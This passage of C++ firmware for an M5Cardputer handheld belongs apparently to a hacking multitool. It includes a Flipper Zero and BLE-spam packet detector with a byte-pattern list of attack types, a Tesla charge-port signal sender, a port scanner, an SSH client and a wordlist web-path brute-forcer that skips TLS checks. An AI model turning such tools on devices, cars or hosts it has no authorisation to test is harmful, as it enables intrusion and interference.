  for (int i = listStartIndex; i < min(int(pcapFiles.size()), listStartIndex + listDisplayLimit); i++) {
    if (i == currentListIndexPcap) {
      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, (i - listStartIndex) * 18);
    M5.Display.println(pcapFiles[i]);
  }
  M5.Display.display();
}

void navigatePcapList(bool next) {
  if (next) {
    currentListIndexPcap++;
    if (currentListIndexPcap >= pcapFiles.size()) {
      currentListIndexPcap = 0;
    }
  } else {
    currentListIndexPcap--;
    if (currentListIndexPcap < 0) {
      currentListIndexPcap = pcapFiles.size() - 1;
    }
  }
  displayPcapList();
}
//Check handshake end



// Wof part // from a really cool idea of Kiyomi // https://github.com/K3YOMI/Wall-of-Flippers
unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
static bool isBLEInitialized = false;

struct ForbiddenPacket {
  const char* pattern;
  const char* type;
};

std::vector<ForbiddenPacket> forbiddenPackets = {
  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"}, // not working ?
  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"}, // refactored for working
  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"}, // working
  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"}, // working
  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"}, // not working cant find raw data in sniff
  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},// refactored for working
  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},//working
  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},//working
  {"ff006db643ce97fe427c___________", "LOVE_TOYS"} // working
};

bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
  size_t patternLength = strlen(pattern);
  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
    char byteString[3] = {pattern[i], pattern[i + 1], 0};
    if (byteString[0] == '_' && byteString[1] == '_') continue;

    uint8_t byteValue = strtoul(byteString, nullptr, 16);
    if (payload[j] != byteValue) return false;
  }
  return true;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    int lineCount = 0;
    const int maxLines = 10;
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String deviceColor = "Unknown"; // Défaut
      bool isValidMac = false; // validité de l'adresse MAC
      bool isFlipper = false; // Flag pour identifier si le dispositif est un Flipper

      // Vérifier directement les UUIDs pour déterminer la couleur
      if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "White";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Black";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Transparent";
        isFlipper = true;
      }

      // Continuer uniquement si un Flipper est identifié
      if (isFlipper) {
        String macAddress = advertisedDevice.getAddress().toString().c_str();
        if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27")) {
          isValidMac = true;
        }

        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.setCursor(0, 10);
        String name = advertisedDevice.getName().c_str();

        M5.Display.printf("Name: %s\nRSSI: %d \nMAC: %s\n",
                          name.c_str(),
                          advertisedDevice.getRSSI(),
                          macAddress.c_str());
        recordFlipper(name, macAddress, deviceColor, isValidMac); // Passer le statut de validité de l'adresse MAC
        lastFlipperFoundMillis = millis();
      }

      std::string advData = advertisedDevice.getManufacturerData();
      if (!advData.empty()) {
        const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
        size_t length = advData.length();

        /*
                Serial.print("Raw Data: ");
                for (size_t i = 0; i < length; i++) {
                  Serial.printf("%02X", payload[i]); // Afficher chaque octet en hexadécimal
                }
                Serial.println(); // Nouvelle ligne après les données brutes*/

        for (auto& packet : forbiddenPackets) {
          if (matchPattern(packet.pattern, payload, length)) {
            if (lineCount >= maxLines) {
              M5.Display.fillRect(0, 58, 325, 185, BLACK); // Réinitialiser la zone d'affichage des paquets interdits
              M5.Display.setCursor(0, 59);
              lineCount = 0; // Réinitialiser si le maximum est atteint
            }
            M5.Display.printf("%s\n", packet.type);
            lineCount++;
            break;
          }
        }
      }
    }
};


bool isMacAddressRecorded(const String& macAddress) {
  File file = SD.open("/WoF.txt", FILE_READ);
  if (!file) {
    return false;
  }
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(macAddress) >= 0) {
      file.close();
      return true;
    }
  }

  file.close();
  return false;
}

void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
  if (!isMacAddressRecorded(macAddress)) {
    File file = SD.open("/WoF.txt", FILE_APPEND);
    if (file) {
      String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
      file.println(name + " - " + macAddress + " - " + color + status);
      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
    }
    file.close();
  }
}

void initializeBLEIfNeeded() {
  if (!isBLEInitialized) {
    BLEDevice::init("");
    isBLEInitialized = true;
    Serial.println("BLE initialized for scanning.");
  }
}


void wallOfFlipper() {
  bool btnBPressed = false; //debounce
  M5.Display.fillScreen(BLACK);
  M5.Display.setCursor(0, 10);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(WHITE);
  M5.Display.println("Waiting for Flipper");

  initializeBLEIfNeeded();
  delay(200);
  enterDebounce();
  while (true) {
    M5.update(); // Mettre à jour l'état des boutons
    M5Cardputer.update();
    // Gestion du bouton B pour basculer entre le mode auto et statique
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      waitAndReturnToMenu("Stop detection...");
      return;
    }
    if (millis() - lastFlipperFoundMillis > 10000) { // 30000 millisecondes = 30 secondes
      M5.Display.fillScreen(BLACK);
      M5.Display.setCursor(0, 10);
      M5.Display.setTextSize(1.5);
      M5.Display.setTextColor(WHITE);
      M5.Display.println("Waiting for Flipper");

      lastFlipperFoundMillis = millis();
    }
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
    pBLEScan->setActiveScan(true);
    pBLEScan->start(1, false);
  }
  waitAndReturnToMenu("Stop detection...");
}
// Wof part end


//Send Tesla code
void sendTeslaCode() {
  M5Cardputer.Lcd.setTextSize(1.5);
  pinMode(signalPin, OUTPUT);
  digitalWrite(signalPin, LOW);

  M5.Lcd.setTextSize(1.5);
  M5.Lcd.fillRect(0, 0, 320, 240, TFT_BLACK);
  M5.Lcd.fillRect(0, 0, 320, 20, M5.Lcd.color565(38, 38, 38));
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("Tesla Code Sender", 30, 1, 2);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);

  M5.Lcd.setCursor(5, M5.Display.height() / 2);
  M5.Lcd.print("Press Enter to send data");
  enterDebounce();
  while (true) {
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      Serial.println("SEND");
      M5Cardputer.Lcd.setCursor(10, M5.Display.height() / 2 + 30);
      M5Cardputer.Lcd.print("Sending Tesla Code ...");
      sendSignals();
      M5Cardputer.Lcd.setCursor(10, M5.Display.height() / 2 + 30);
      M5Cardputer.Lcd.print("                      ");
    }
    if ( M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      waitAndReturnToMenu("Return to menu...");
      return;
    }
    delay(10);
    M5Cardputer.update();
  }
}

void sendSignals() {
  for (uint8_t t = 0; t < transmissions; t++) {
    for (uint8_t i = 0; i < messageLength; i++) {
      sendByte(sequence[i]);
    }
    digitalWrite(signalPin, LOW);
    delay(messageDistance);
  }
}

void sendByte(uint8_t dataByte) {
  for (int8_t bit = 7; bit >= 0; bit--) { // MSB
    digitalWrite(signalPin, (dataByte & (1 << bit)) != 0 ? HIGH : LOW);
    delayMicroseconds(pulseWidth);
  }
}


//Send Tesla code end


// Fonction pour se connecter au Wi-Fi
bool connectToWiFi(const String& ssid, const String& password) {
  WiFi.begin(ssid.c_str(), password.c_str());

  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("Connecting to WiFi...");
  M5.Display.display();

  Serial.print("Connecting to SSID: ");
  Serial.println(ssid);

  int timeout = 10; // Timeout de 10 secondes pour la connexion
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(1000);
    timeout--;
    Serial.print(".");
  }
  Serial.println();

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("WiFi connected successfully!");
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Connected!");
    M5.Display.setCursor(0, 30);
    M5.Display.println("IP: " + WiFi.localIP().toString());
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return true;
  } else {
    Serial.println("Failed to connect to WiFi.");
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Failed to connect.");
    M5.Display.setCursor(0, 30);
    M5.Display.println("Please try again.");
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return false;
  }
}

// Fonction principale de connexion Wi-Fi
void connectWifi(int networkIndex) {
  Serial.println("Starting WiFi connection process...");

  if (WiFi.localIP().toString() != "0.0.0.0") {
    if (confirmPopup("You want to disconnect ?")) {
      Serial.println("Disconnecting from current WiFi...");
      WiFi.disconnect(true);
      waitAndReturnToMenu("Disconnected");
      return;
    } else {
      waitAndReturnToMenu("Stay connected...");
      return;
    }
  }

  String nameSSID = ssidList[networkIndex];
  String password = "";

  Serial.print("Selected network SSID: ");
  Serial.println(nameSSID);

  // Si le réseau est ouvert, passer directement à la connexion
  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println("Network is open, no password required.");
    if (connectToWiFi(nameSSID, "")) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
    } else {
      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
    }
    return;
  }

  // Demander le mot de passe pour les réseaux sécurisés
  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("Enter Password for " + nameSSID + " :");
  M5.Display.setCursor(0, 30);
  M5.Display.display();
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        for (auto i : status.word) {
          password += i;
        }

        if (status.del && password.length() > 0) {
          password.remove(password.length() - 1);
        }

        M5.Display.clear();
        M5.Display.setCursor(0, 10);
        M5.Display.println("Password for " + nameSSID + " :");
        M5.Display.setCursor(0, 30);
        M5.Display.println(password); // Affichez le mot de passe en clair
        M5.Display.display();

        if (status.enter) {
          Serial.print("Attempting to connect to WiFi with password: ");
          Serial.println(password);

          if (connectToWiFi(nameSSID, password)) {
            waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
          } else {
            waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
          }
          break;
        }
      }
      delay(200);
    }
  }
}

// connect to SSH

//from https://github.com/fernandofatech/M5Cardputer-SSHClient and refactored
bool sshKilled = false;
void testConnectivity(const char *host) {
  M5.Display.clear();
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(0, 10);
  Serial.println("Pinging Host...");
  M5.Display.print("Pinging: " + String(host));
  if (Ping.ping(host)) {
    M5.Display.setCursor(0, 10);
    Serial.println("Ping successfull");
    M5.Display.println("Ping successfull                            ");
  } else {
    M5.Display.setCursor(0, 10);
    M5.Display.println("Ping Failed                                 ");
    Serial.println("Ping failed");
  }
}

ssh_session connect_ssh(const char *host, const char *user, int port) {
  ssh_session session = ssh_new();
  if (session == NULL) {
    Serial.println("Failed to create SSH session");
    return NULL;
  }

  ssh_options_set(session, SSH_OPTIONS_HOST, host);
  ssh_options_set(session, SSH_OPTIONS_USER, user);
  ssh_options_set(session, SSH_OPTIONS_PORT, &port);

  if (ssh_connect(session) != SSH_OK) {
    Serial.print("Error connecting to host");
    M5.Display.setCursor(0, 10);
    M5.Display.print("Error connecting to host");
    Serial.println(ssh_get_error(session));
    ssh_free(session);
    return NULL;
  }

  return session;
}

int authenticate_console(ssh_session session, const char *password) {
  int rc = ssh_userauth_password(session, NULL, password);
  if (rc != SSH_AUTH_SUCCESS) {
    Serial.print("Password error authenticating");
    M5.Display.setCursor(0, 10);
    M5.Display.print("Password error authenticating");
    Serial.println(ssh_get_error(session));
    return rc;
  }
  return SSH_OK;
}

void sshConnectTask(void *pvParameters) {
  testConnectivity(ssh_host.c_str()); // Test de connectivité

  my_ssh_session = connect_ssh(ssh_host.c_str(), ssh_user.c_str(), ssh_port);
  if (my_ssh_session == NULL) {
    Serial.println("SSH Connection failed.");
    M5.Display.setCursor(0, 10);
    M5.Display.print("SSH Connection failed.");
    vTaskDelete(NULL);
    return;
  }

  if (authenticate_console(my_ssh_session, ssh_password.c_str()) != SSH_OK) {
    Serial.println("SSH Authentication failed.");
    M5.Display.setCursor(0, 10);
    M5.Display.print("SSH Authentication failed.");
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  my_channel = ssh_channel_new(my_ssh_session);
  if (my_channel == NULL || ssh_channel_open_session(my_channel) != SSH_OK) {
    Serial.println("SSH Channel open error.");
    M5.Display.setCursor(0, 10);
    M5.Display.print("SSH Channel open error.");
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  if (ssh_channel_request_pty(my_channel) != SSH_OK || ssh_channel_request_shell(my_channel) != SSH_OK) {
    Serial.println("Request PTY/Shell failed.");
    M5.Display.setCursor(0, 10);
    M5.Display.print("Request PTY/Shell failed.");
    ssh_channel_close(my_channel);
    ssh_channel_free(my_channel);
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("SSH Connection established.");
  M5.Display.display();

  xTaskCreatePinnedToCore(sshTask, "SSH Task", 40000, NULL, 1, NULL, 1);
  vTaskDelete(NULL);
}

String getUserInput(bool isPassword = false) {
  String input = "";
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(0, 30);
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        for (auto i : status.word) {
          input += i;
        }

        if (status.del && input.length() > 0) {
          input.remove(input.length() - 1);
          M5.Display.setCursor(0, 30);
          M5.Display.print("                                          ");
        }

        if (status.enter && input.length() > 0) {
          return input;
        }

        M5.Display.setCursor(0, 30);
        M5.Display.print(input);
        M5.Display.display();
      }
    }
    delay(200); // Petit délai pour réduire la charge du processeur
  }
}

void parseUserHostPort(const String &input, String &user, String &host, int &port) {
  int atIndex = input.indexOf('@');
  int colonIndex = input.indexOf(':');
  if (atIndex != -1 && colonIndex != -1) {
    user = input.substring(0, atIndex);
    host = input.substring(atIndex + 1, colonIndex);
    port = input.substring(colonIndex + 1).toInt();
  }
}


// Fonction principale pour se connecter via SSH
void sshConnect(const char *host) {
   sshKilled = false;
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  if (host == nullptr) {
    // Demander à l'utilisateur s'il souhaite utiliser les informations stockées si elles ne sont pas vides
    if (ssh_user != "" && ssh_host != "" && ssh_password != "") {
      if (confirmPopup("Use stored SSH details?")) {
        // Utiliser les informations stockées
        Serial.print("Using stored SSH details: ");
        Serial.println("User: " + ssh_user + ", Host: " + ssh_host + ", Port: " + String(ssh_port));
      } else {
        // Demander de nouvelles informations
        ssh_user = "";
        ssh_host = "";
        ssh_password = "";
      }
    }

    if (ssh_user == "" || ssh_host == "" || ssh_password == "") {
      M5.Display.clear();
      M5.Display.setCursor(0, 10);
      M5.Display.println("Enter SSH User@Host:Port:");
      String userHostPort = getUserInput();
      parseUserHostPort(userHostPort, ssh_user, ssh_host, ssh_port);
    }
  } else {
    ssh_host = host;
    ssh_password = "";
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Enter SSH User:");
    ssh_user = getUserInput();

    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Enter SSH Port:");
    String portStr = getUserInput();
    ssh_port = portStr.toInt();
  }
  if (ssh_password == "") {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Enter SSH Password:");
    ssh_password = getUserInput();
  }
  if (ssh_user.length() == 0 || ssh_host.length() == 0 || ssh_password.length() == 0) {
    waitAndReturnToMenu("Invalid input.");
    return;
  }

  Serial.print("SSH User: ");
  Serial.println(ssh_user);
  Serial.print("SSH Host: ");
  Serial.println(ssh_host);
  Serial.print("SSH Port: ");
  Serial.println(ssh_port);

  TaskHandle_t sshConnectTaskHandle = NULL;
  xTaskCreatePinnedToCore(sshConnectTask, "SSH Connect Task", 40000, NULL, 1, &sshConnectTaskHandle, 1);
  if (sshConnectTaskHandle == NULL) {
    Serial.println("Failed to create SSH Connect Task");
  } else {
    while (true) {
      if (sshKilled) {
        delay(1000);
        break;
      }
      delay(100);
    }
  }
  waitAndReturnToMenu("Back to menu");
}

// Convert String to std::string
std::string StringToStdString(const String &input) {
  return std::string(input.c_str());
}

// Convert std::string to String
String StdStringToString(const std::string &input) {
  return String(input.c_str());
}

// Function to remove ANSI escape codes
String removeANSIEscapeCodes(const String &input) {
  std::string output = StringToStdString(input);

  // Regex for ANSI escape codes
  std::regex ansi_regex(R"(\x1B\[[0-?]*[ -/]*[@-~])");
  output = std::regex_replace(output, ansi_regex, "");

  // Remove other escape codes
  std::regex other_escape_codes(R"(\x1B\]0;.*?\x07|\x1B\[\?1[hl]|\x1B\[\?2004[hl]|\x1B=|\x1B>|(\x07)|(\x08)|(\x1B\(B))");
  output = std::regex_replace(output, other_escape_codes, "");

  // Remove non-printable characters except space
  output.erase(std::remove_if(output.begin(), output.end(), [](unsigned char c) {
    return !std::isprint(c) && !std::isspace(c);
  }), output.end());

  return StdStringToString(output);
}

String trimString(const String &str) {
  int start = 0;
  while (start < str.length() && isspace(str[start])) {
    start++;
  }

  int end = str.length() - 1;
  while (end >= 0 && isspace(str[end])) {
    end--;
  }

  return str.substring(start, end + 1);
}

void sshTask(void *pvParameters) {
  ssh_channel channel = my_channel;
  if (channel == NULL) {
    M5Cardputer.Display.println("SSH Channel not open.");
    vTaskDelete(NULL);
    return;
  }

  String commandBuffer = "> ";
  String currentCommand = "";
  int cursorX = 0;
  int cursorY = 0;
  const int lineHeight = 16;
  unsigned long lastKeyPressMillis = 0;
  const unsigned long debounceDelay = 200;

  int displayHeight = M5Cardputer.Display.height();
  int displayWidth = M5Cardputer.Display.width();
  int totalLines = displayHeight / lineHeight;
  int currentLine = 0;

  M5Cardputer.Display.clear();
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setCursor(cursorX, cursorY);
  M5Cardputer.Display.print(commandBuffer);
  M5Cardputer.Display.display();

  while (true) {
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        unsigned long currentMillis = millis();
        if (currentMillis - lastKeyPressMillis >= debounceDelay) {
          Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

          // Check for esc key press
          if (M5Cardputer.Keyboard.isKeyPressed('`')) {
            Serial.println("esc pressed, closing SSH session and returning to menu");
            // Close SSH session and return to menu
            sshKilled = true;
            break;
          }

          // Check for CTRL+C
          if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed('C')) {
            Serial.println("CTRL+C pressed, sending interrupt signal to SSH session");
            ssh_channel_write(channel, "\x03", 1); // Send CTRL+C
          }
          // Check for TAB // not working properlly
          else if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB)) {
            Serial.println("TAB pressed, requesting completion from SSH session");
            String completionCommand = currentCommand + '\t'; // Append TAB character for completion
            Serial.print("Command sent: ");
            Serial.println(completionCommand);
            ssh_channel_write(channel, completionCommand.c_str(), completionCommand.length());

            // Read the completion response from the server
            char completionBuffer[1024];
            int completionBytes = ssh_channel_read_nonblocking(channel, completionBuffer, sizeof(completionBuffer), 0);
            if (completionBytes > 0) {
              String completionResponse = "";
              for (int i = 0; i < completionBytes; ++i) {
                completionResponse += completionBuffer[i];
              }

              completionResponse = removeANSIEscapeCodes(completionResponse);

              // Clear the current command and buffer
              commandBuffer = "> ";
              currentCommand = "";

              // Update the command buffer with the completion response
              currentCommand = trimString(completionResponse);
              commandBuffer += currentCommand;

              // Clear the display and update with new command
              M5Cardputer.Display.clear();
              cursorX = 0;
              cursorY = 0;
              currentLine = 0;
              M5Cardputer.Display.setCursor(cursorX, cursorY);
              M5Cardputer.Display.print(commandBuffer);
              M5Cardputer.Display.display();
            }
          }
          else {
            for (auto i : status.word) {
              commandBuffer += i;
              currentCommand += i;
              M5Cardputer.Display.print(i);
              cursorX = M5Cardputer.Display.getCursorX();
              if (cursorX >= displayWidth) {
                cursorX = 0;
                cursorY += lineHeight;
                currentLine++;
                if (currentLine >= totalLines) {
                  M5Cardputer.Display.scroll(0, -lineHeight);
                  cursorY = displayHeight - lineHeight;
                  currentLine = totalLines - 1;
                }
                M5Cardputer.Display.setCursor(cursorX, cursorY);
              }
            }

            if (status.del && commandBuffer.length() > 2) {
              commandBuffer.remove(commandBuffer.length() - 1);
              currentCommand.remove(currentCommand.length() - 1);
              cursorX -= 6;
              if (cursorX < 0) {
                cursorX = displayWidth - 6;
                cursorY -= lineHeight;
                currentLine--;
                if (currentLine < 0) {
                  currentLine = 0;
                  cursorY = 0;
                }
              }
              M5Cardputer.Display.setCursor(cursorX, cursorY);
              M5Cardputer.Display.print(" ");
              M5Cardputer.Display.setCursor(cursorX, cursorY);
            }

            if (status.enter) {
              String message = currentCommand + "\r";
              Serial.print("Command sent: ");
              Serial.println(message);
              ssh_channel_write(channel, message.c_str(), message.length());

              commandBuffer = "> ";
              currentCommand = "";
              cursorY += lineHeight;
              currentLine++;
              if (cursorY >= displayHeight) {
                M5Cardputer.Display.scroll(0, -lineHeight);
                cursorY = displayHeight - lineHeight;
                currentLine = totalLines - 1;
              }
              cursorX = 0;
              M5Cardputer.Display.setCursor(cursorX, cursorY);
              M5Cardputer.Display.print(commandBuffer);
            }
          }

          M5Cardputer.Display.display();
          lastKeyPressMillis = currentMillis;
        }
      }
    }

    char buffer[1024];
    int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
    if (nbytes > 0) {
      String output = "";
      for (int i = 0; i < nbytes; ++i) {
        output += buffer[i];
      }

      output = removeANSIEscapeCodes(output);

      for (int i = 0; i < output.length(); ++i) {
        if (output[i] == '\r') {
          continue;
        } else if (output[i] == '\n') {
          cursorY += lineHeight;
          currentLine++;
          if (cursorY >= displayHeight) {
            M5Cardputer.Display.scroll(0, -lineHeight);
            cursorY = displayHeight - lineHeight;
            currentLine = totalLines - 1;
          }
          cursorX = 0;
          M5Cardputer.Display.setCursor(cursorX, cursorY);
        } else {
          M5Cardputer.Display.print(output[i]);
          cursorX += 6;
          if (cursorX >= displayWidth) {
            cursorX = 0;
            cursorY += lineHeight;
            currentLine++;
            if (cursorY >= displayHeight) {
              M5Cardputer.Display.scroll(0, -lineHeight);
              cursorY = displayHeight - lineHeight;
              currentLine = totalLines - 1;
            }
            M5Cardputer.Display.setCursor(cursorX, cursorY);
          }
        }
      }
      M5Cardputer.Display.display();

      Serial.print("Output received: ");
      Serial.println(output);
    }

    if (nbytes < 0 || ssh_channel_is_closed(channel)) {
      Serial.println("SSH channel closed or error occurred.");
      break;
    }
  }

  // Close the SSH session and free resources
  ssh_channel_close(channel);
  ssh_channel_free(channel);
  ssh_disconnect(my_ssh_session);
  ssh_free(my_ssh_session);

  vTaskDelete(NULL);
}

// connect to SSH End

// scan single IP

void scanIpPort() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }
  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("Enter IP Address:");
  M5.Display.setCursor(0, M5Cardputer.Display.height() - 20);
  M5.Display.println("Current IP:" + WiFi.localIP().toString());
  scanIp = getUserInput();

  IPAddress ip;
  if (ip.fromString(scanIp)) {
    scanPorts(ip);
  } else {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Invalid IP Address");
    delay(1000); // Afficher le message pendant 1 secondes

  }
  waitAndReturnToMenu("Return to menu");
}

// scan single IP end


// Web crawling
std::vector<String> urlList;  // Dynamic list for URLs
int startIndex = 0;           // Start index for display
const int maxDisplayLines = 11; // Maximum number of lines to display at a time
String urlBase = "";

void displayUrls() {
  M5.Display.clear();
  M5.Display.setCursor(0, 0);

  int displayCount = std::min(maxDisplayLines, (int)urlList.size());
  for (int i = 0; i < displayCount; ++i) {
    int displayIndex = (startIndex + i) % urlList.size();
    M5.Display.setCursor(0, 10 + i * 10);
    M5.Display.println(urlList[displayIndex]);
  }

  // Display position indicator
  M5.Display.setCursor(0, 0);
  M5.Display.printf(" %d-%d of %d on %s\n", startIndex + 1, startIndex + displayCount, urlList.size(), urlBase.c_str());
}

void addUrl(const String &url) {
  urlList.push_back(url);
  if (urlList.size() > maxDisplayLines) {
    startIndex = urlList.size() - maxDisplayLines;
  }
  displayUrls();
}

void scrollUp() {
  if (startIndex > 0) {
    startIndex--;
    displayUrls();
  }
}

void scrollDown() {
  if (startIndex + maxDisplayLines < urlList.size()) {
    startIndex++;
    displayUrls();
  }
}

void webCrawling(const IPAddress &ip) {
  webCrawling(ip.toString());
}

bool handleHttpResponse(HTTPClient &http, String &url) {
  int httpCode = http.GET();
  if (httpCode == 301 || httpCode == 302) {
    String newLocation = http.getLocation();
    if (confirmPopup("Redirection detected. Follow?\n" + newLocation)) {
      M5.Display.setTextSize(1);
      url = newLocation.startsWith("/") ? url.substring(0, url.indexOf('/', 8)) + newLocation : newLocation;
      return true;
    }
  }
  return (httpCode == 200);
}

void setupHttpClient(HTTPClient &http, WiFiClient &client, WiFiClientSecure &secureClient, String &url) {
  if (url.startsWith("https://")) {
    secureClient.setInsecure();
    http.begin(secureClient, url);
  } else {
    http.begin(client, url);
  }
  http.setTimeout(200); // Set timeout to 500 milliseconds
}

void webCrawling(const String &urlOrIp) {
  enterDebounce();
  startIndex = 0;
  urlList.clear();  // Clear the URL list at the start of crawling
  M5.Display.setTextColor(WHITE, BLACK);
  M5.Display.setTextSize(1);

  // Mettre à jour la variable globale `urlBase`
  if (urlOrIp.isEmpty()) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Enter IP or Domain:");
    urlBase = getUserInput();
    M5.Display.setTextSize(1);
  } else {
    urlBase = urlOrIp;
  }

  // Vérifier si l'entrée utilisateur est une adresse IP valide
  IPAddress ip;
  if (ip.fromString(urlBase)) {
    urlBase = "http://" + urlBase;
  } else if (!urlBase.startsWith("http://") && !urlBase.startsWith("https://")) {
    urlBase = "http://" + urlBase;
  }

  WiFiClient client;
  WiFiClientSecure secureClient;
  HTTPClient http;
  bool urlAccessible = false;

  setupHttpClient(http, client, secureClient, urlBase);
  if (handleHttpResponse(http, urlBase)) {
    urlAccessible = true;
  } else if (urlBase.startsWith("http://") && confirmPopup("HTTP not accessible. Try HTTPS?")) {
    M5.Display.setTextSize(1);
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Setup Https...");
    urlBase.replace("http://", "https://");
    setupHttpClient(http, client, secureClient, urlBase);
    if (handleHttpResponse(http, urlBase)) {
      urlAccessible = true;
    }
  }

  if (!urlAccessible) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("URL not accessible.");
    delay(3000);  // Afficher le message pendant 3 secondes
    waitAndReturnToMenu("Returning to menu...");
    return;  // Return to the menu
  }

  displayUrls();

  File file = SD.open("/crawler_wordlist.txt");
  if (!file) {
    M5.Display.clear();
    M5.Display.setCursor(0, 10);
    M5.Display.println("Failed to open file for reading");
    delay(2000);  // Afficher le message pendant 2 secondes
    return;
  }

  Serial.println("-------- Starting crawling on :" + urlBase);
  while (file.available()) {
    M5.update();
    M5Cardputer.update();
    String path = file.readStringUntil('\n');
    path.trim();
    if (path.length() > 0) {
      String fullUrl = urlBase;
      if (!urlBase.endsWith("/")) {
        fullUrl += "/";
      }
      fullUrl += path;
      Serial.println("Testing path: " + fullUrl);
      M5.Display.setCursor(0, M5.Display.height() - 10);
      M5.Display.println("On: /" + path + "                                                             ");
      setupHttpClient(http, client, secureClient, fullUrl);
      if (http.GET() == 200) {
        addUrl(path);  // Ajouter l'URL à la liste et mettre à jour l'affichage
        Serial.println("------------------------------------ Path that respond 200 : /" + fullUrl);
      }
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      M5.Display.setCursor(0, M5.Display.height() - 10);
      M5.Display.println("Crawling Stopped!");
      enterDebounce();
      break;  // Quitter la boucle
    }
  }

  file.close();
